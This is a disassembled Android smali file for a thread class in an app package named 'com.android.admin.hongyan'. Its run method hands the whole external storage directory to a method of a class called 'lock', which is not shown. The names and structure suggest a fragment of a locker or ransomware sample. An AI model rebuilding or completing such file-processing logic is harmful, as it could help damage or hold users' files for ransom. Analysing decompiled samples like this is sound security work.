.class Lcom/android/admin/hongyan/lock$100000003$100000002;
.super Ljava/lang/Thread;
.source "lock.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/admin/hongyan/lock$100000003;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000002"
.end annotation


# instance fields
.field private final this$0:Lcom/android/admin/hongyan/lock$100000003;


# direct methods
.method constructor <init>(Lcom/android/admin/hongyan/lock$100000003;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Thread;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/android/admin/hongyan/lock$100000003$100000002;->this$0:Lcom/android/admin/hongyan/lock$100000003;

    return-void
.end method

.method static access$0(Lcom/android/admin/hongyan/lock$100000003$100000002;)Lcom/android/admin/hongyan/lock$100000003;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/android/admin/hongyan/lock$100000003$100000002;->this$0:Lcom/android/admin/hongyan/lock$100000003;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 78
    move-object v0, p0

    move-object v2, v0

    iget-object v2, v2, Lcom/android/admin/hongyan/lock$100000003$100000002;->this$0:Lcom/android/admin/hongyan/lock$100000003;

    invoke-static {v2}, Lcom/android/admin/hongyan/lock$100000003;->access$0(Lcom/android/admin/hongyan/lock$100000003;)Lcom/android/admin/hongyan/lock;

    move-result-object v2

    new-instance v3, Ljava/io/File;

    move-object v6, v3

    move-object v3, v6

    move-object v4, v6

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Lcom/android/admin/hongyan/lock;->b(Ljava/io/File;)V

    return-void
.end method
